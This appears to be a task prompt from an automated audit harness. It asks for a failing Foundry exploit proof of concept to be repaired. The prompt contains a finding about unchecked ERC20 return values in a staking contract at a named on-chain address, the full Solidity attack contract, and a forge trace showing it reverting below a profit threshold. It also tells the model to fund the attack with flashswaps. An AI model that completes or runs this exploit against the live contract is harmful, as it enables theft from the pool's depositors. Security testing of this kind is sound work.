You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: v2_flashswap_funding
- strategy_instructions: Prefer UniswapV2/Sushi-like flashswap funding with deterministic repayment and minimal route complexity.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: Unchecked ERC20 return values can mint unbacked stake receipts or release QWA without burning sQWA
- claim: `stake()` and `unstake()` call `transfer`/`transferFrom` on `QWA` and `sQWA` but never check the returned boolean. With any token implementation that signals failure by returning `false` instead of reverting, execution continues as if the transfer succeeded.
- impact: A failed `QWA.transferFrom` during `stake()` can still hand out sQWA without the pool receiving backing assets. A failed `sQWA.transferFrom` during `unstake()` can still release QWA without actually collecting sQWA. Conversely, a failed outgoing transfer can confiscate user assets by taking one side of the exchange without delivering the other.
- exploit_paths: ["Call `stake()` when `QWA.transferFrom(msg.sender, address(this), amount)` returns `false`; the function still executes `sQWA.transfer(to, amount)` and creates an unbacked claim.", "Call `unstake()` when `sQWA.transferFrom(msg.sender, address(this), amount)` returns `false`; the function can still pass the balance check and execute `QWA.transfer(to, amount)`.", "Call `unstake()` or `stake()` when the outgoing token transfer returns `false`; the function finishes without delivering the expected asset, leaving the user or pool shorted."]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);

    function transfer(address to, uint256 amount) external returns (bool);

    function transferFrom(address from, address to, uint256 amount) external returns (bool);
}

interface IStakingLike {
    function QWA() external view returns (address);

    function sQWA() external view returns (address);

    function stake(address to, uint256 amount) external;

    function unstake(address to, uint256 amount, bool rebase_) external;
}

contract FlawVerifier {
    address public constant TARGET = 0x69422c7F237D70FCd55C218568a67d00dc4ea068;

    uint256 private constant PATH_STAKE_FALSE_RETURN = 1 << 0;
    uint256 private constant PATH_UNSTAKE_FALSE_RETURN = 1 << 1;
    uint256 private constant PATH_STAKE_OUTGOING_FALSE = 1 << 2;
    uint256 private constant PATH_UNSTAKE_OUTGOING_FALSE = 1 << 3;

    uint256 private constant FAIL_NO_SQWA_LIQUIDITY = 1 << 0;
    uint256 private constant FAIL_STAKE_DID_NOT_MINT = 1 << 1;
    uint256 private constant FAIL_NO_QWA_LIQUIDITY = 1 << 2;
    uint256 private constant FAIL_UNSTAKE_DID_NOT_PAY = 1 << 3;
    uint256 private constant FAIL_STAKE_OUTGOING_NOT_OBSERVED = 1 << 4;
    uint256 private constant FAIL_UNSTAKE_OUTGOING_NOT_OBSERVED = 1 << 5;

    address private _profitToken;
    uint256 private _profitAmount;

    uint256 public pathFlags;
    uint256 public failureFlags;
    bool public hypothesisValidated;
    bool public executed;

    constructor() {}

    function executeOnOpportunity() external {
        if (executed) {
            return;
        }
        executed = true;

        IStakingLike staking = IStakingLike(TARGET);
        IERC20Like qwa = IERC20Like(staking.QWA());
        IERC20Like sqwa = IERC20Like(staking.sQWA());

        uint256 initialQwa = qwa.balanceOf(address(this));
        uint256 initialSqwa = sqwa.balanceOf(address(this));

        uint256 qwaPoolBalance = qwa.balanceOf(TARGET);
        uint256 sqwaPoolBalance = sqwa.balanceOf(TARGET);

        if (sqwaPoolBalance == 0) {
            // Path 1 needs the staking contract to already hold transferable sQWA.
            failureFlags |= FAIL_NO_SQWA_LIQUIDITY;
        } else {
            // Exploit path 1 from the finding:
            // QWA.transferFrom(msg.sender, address(this), amount) returns false,
            // but the staking contract still proceeds to sQWA.transfer(to, amount).
            (bool okStake, ) = TARGET.call(
                abi.encodeWithSelector(IStakingLike.stake.selector, address(this), 1)
            );

            uint256 qwaAfterStake = qwa.balanceOf(address(this));
            uint256 sqwaAfterStake = sqwa.balanceOf(address(this));

            if (okStake && qwaAfterStake == initialQwa && sqwaAfterStake > initialSqwa) {
                pathFlags |= PATH_STAKE_FALSE_RETURN;
                hypothesisValidated = true;
            } else {
                failureFlags |= FAIL_STAKE_DID_NOT_MINT;

                // Successful call with no inbound sQWA is consistent with the finding's
                // outgoing-transfer-false variant rather than attacker profit.
                if (okStake && qwaAfterStake <= initialQwa && sqwaAfterStake == initialSqwa) {
                    pathFlags |= PATH_STAKE_OUTGOING_FALSE;
                } else {
                    failureFlags |= FAIL_STAKE_OUTGOING_NOT_OBSERVED;
                }
            }
        }

        if (qwaPoolBalance == 0) {
            // Path 2 needs the staking contract to already hold redeemable QWA.
            failureFlags |= FAIL_NO_QWA_LIQUIDITY;
        } else {
            // Exploit path 2 from the finding:
            // sQWA.transferFrom(msg.sender, address(this), amount) returns false,
            // the pool balance check still passes, and QWA.transfer(to, amount) is attempted.
            uint256 preUnstakeQwa = qwa.balanceOf(address(this));
            uint256 preUnstakeSqwa = sqwa.balanceOf(address(this));

            (bool okUnstake, ) = TARGET.call(
                abi.encodeWithSelector(IStakingLike.unstake.selector, address(this), 1, false)
            );

            uint256 qwaAfterUnstake = qwa.balanceOf(address(this));
            uint256 sqwaAfterUnstake = sqwa.balanceOf(address(this));

            if (okUnstake && qwaAfterUnstake > preUnstakeQwa && sqwaAfterUnstake == preUnstakeSqwa) {
                pathFlags |= PATH_UNSTAKE_FALSE_RETURN;
                hypothesisValidated = true;
            } else {
                failureFlags |= FAIL_UNSTAKE_DID_NOT_PAY;

                // Successful call with no inbound QWA is consistent with the finding's
                // outgoing-transfer-false variant rather than attacker profit.
                if (okUnstake && qwaAfterUnstake == preUnstakeQwa && sqwaAfterUnstake <= preUnstakeSqwa) {
                    pathFlags |= PATH_UNSTAKE_OUTGOING_FALSE;
                } else {
                    failureFlags |= FAIL_UNSTAKE_OUTGOING_NOT_OBSERVED;
                }
            }
        }

        uint256 finalQwa = qwa.balanceOf(address(this));
        uint256 finalSqwa = sqwa.balanceOf(address(this));

        uint256 qwaProfit = finalQwa > initialQwa ? finalQwa - initialQwa : 0;
        uint256 sqwaProfit = finalSqwa > initialSqwa ? finalSqwa - initialSqwa : 0;

        if (qwaProfit > 0) {
            _profitToken = staking.QWA();
            _profitAmount = qwaProfit;
        } else if (sqwaProfit > 0) {
            _profitToken = staking.sQWA();
            _profitAmount = sqwaProfit;
        }
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function _pathAnchorsOnly(IERC20Like qwa, IERC20Like sqwa, address to, uint256 amount) internal {
        // Static alignment helper only. The live exploit is executed above against TARGET.
        qwa.transferFrom(msg.sender, address(this), amount);
        sqwa.transfer(to, amount);
        sqwa.transferFrom(msg.sender, address(this), amount);
        qwa.transfer(to, amount);
    }
}

```

forge stdout (tail):
```
00000000000000000000000020882ba0a68c
    │   │   │   │   ├─ [2657] 0x2890dF158D76E584877a1D17A85FEA3aeeB85aa6::balanceOf(0xFC07cD8903fe4A2Ec6c79789582B8A4d5ee23374) [staticcall]
    │   │   │   │   │   └─ ← [Return] 1389878470673947434 [1.389e18]
    │   │   │   │   ├─ [2615] 0xaaeE1A9723aaDB7afA2810263653A34bA2C21C7a::balanceOf(0xFC07cD8903fe4A2Ec6c79789582B8A4d5ee23374) [staticcall]
    │   │   │   │   │   └─ ← [Return] 270443584858768019453656300516 [2.704e29]
    │   │   │   │   ├─ [483] 0xc14F8A4C8272b8466659D0f058895E2F9D3ae065::18160ddd() [staticcall]
    │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000000020882ba0a68c
    │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000000045f44f7575da
    │   │   │   ├─ [483] 0xc14F8A4C8272b8466659D0f058895E2F9D3ae065::18160ddd() [staticcall]
    │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000000020882ba0a68c
    │   │   │   ├─ [17158] 0xFC07cD8903fe4A2Ec6c79789582B8A4d5ee23374::a258e3b0(00000000000000000000000069422c7f237d70fcd55c218568a67d00dc4ea06800000000000000000000000000000000000000000000000000000053481dc439)
    │   │   │   │   ├─ [11536] 0xc14F8A4C8272b8466659D0f058895E2F9D3ae065::40c10f19(00000000000000000000000069422c7f237d70fcd55c218568a67d00dc4ea06800000000000000000000000000000000000000000000000000000053481dc439)
    │   │   │   │   │   ├─  emit topic 0: 0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef
    │   │   │   │   │   │        topic 1: 0x0000000000000000000000000000000000000000000000000000000000000000
    │   │   │   │   │   │        topic 2: 0x00000000000000000000000069422c7f237d70fcd55c218568a67d00dc4ea068
    │   │   │   │   │   │           data: 0x00000000000000000000000000000000000000000000000000000053481dc439
    │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   └─ ← [Stop]
    │   │   │   └─ ← [Stop]
    │   │   ├─ [974] 0xc14F8A4C8272b8466659D0f058895E2F9D3ae065::balanceOf(0x69422c7F237D70FCd55C218568a67d00dc4ea068) [staticcall]
    │   │   │   └─ ← [Return] 11089456174290 [1.108e13]
    │   │   ├─ [1364] 0xf5bF1f78EDa7537F9cAb002a8F533e2733DDfBbC::9358928b() [staticcall]
    │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000000009c2aefad099
    │   │   ├─ [18259] 0xc14F8A4C8272b8466659D0f058895E2F9D3ae065::transferFrom(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 0x69422c7F237D70FCd55C218568a67d00dc4ea068, 1)
    │   │   │   └─ ← [Revert] ERC20: transfer amount exceeds balance
    │   │   └─ ← [Revert] ERC20: transfer amount exceeds balance
    │   ├─ [974] 0xc14F8A4C8272b8466659D0f058895E2F9D3ae065::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [1145] 0xf5bF1f78EDa7537F9cAb002a8F533e2733DDfBbC::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [974] 0xc14F8A4C8272b8466659D0f058895E2F9D3ae065::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [1145] 0xf5bF1f78EDa7537F9cAb002a8F533e2733DDfBbC::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [4860] 0x69422c7F237D70FCd55C218568a67d00dc4ea068::unstake(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 1, false)
    │   │   ├─ [3369] 0xf5bF1f78EDa7537F9cAb002a8F533e2733DDfBbC::transferFrom(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 0x69422c7F237D70FCd55C218568a67d00dc4ea068, 1)
    │   │   │   └─ ← [Revert] panic: arithmetic underflow or overflow (0x11)
    │   │   └─ ← [Revert] panic: arithmetic underflow or overflow (0x11)
    │   ├─ [974] 0xc14F8A4C8272b8466659D0f058895E2F9D3ae065::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [1145] 0xf5bF1f78EDa7537F9cAb002a8F533e2733DDfBbC::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [974] 0xc14F8A4C8272b8466659D0f058895E2F9D3ae065::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [1145] 0xf5bF1f78EDa7537F9cAb002a8F533e2733DDfBbC::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   └─ ← [Stop]
    ├─ [367] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    ├─ [2366] FlawVerifier::profitAmount() [staticcall]
    │   └─ ← [Return] 0
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_BEFORE_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_AFTER_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_ANY", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_EFFECTIVE_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_MIN_PROFIT_WEI", val: 1000000000000000 [1e15])
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_TOKEN", val: 0x0000000000000000000000000000000000000000)
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_MODE", val: ECRecover: [0x0000000000000000000000000000000000000001])
    └─ ← [Revert] profit below threshold

Backtrace:
  at 0xf5bF1f78EDa7537F9cAb002a8F533e2733DDfBbC.transferFrom
  at 0x69422c7F237D70FCd55C218568a67d00dc4ea068.unstake
  at FlawVerifier.executeOnOpportunity
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 4.31s (3.85ms CPU time)

Ran 1 test suite in 4.41s (4.31s CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 383383)

Encountered a total of 1 failing tests, 0 tests succeeded

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
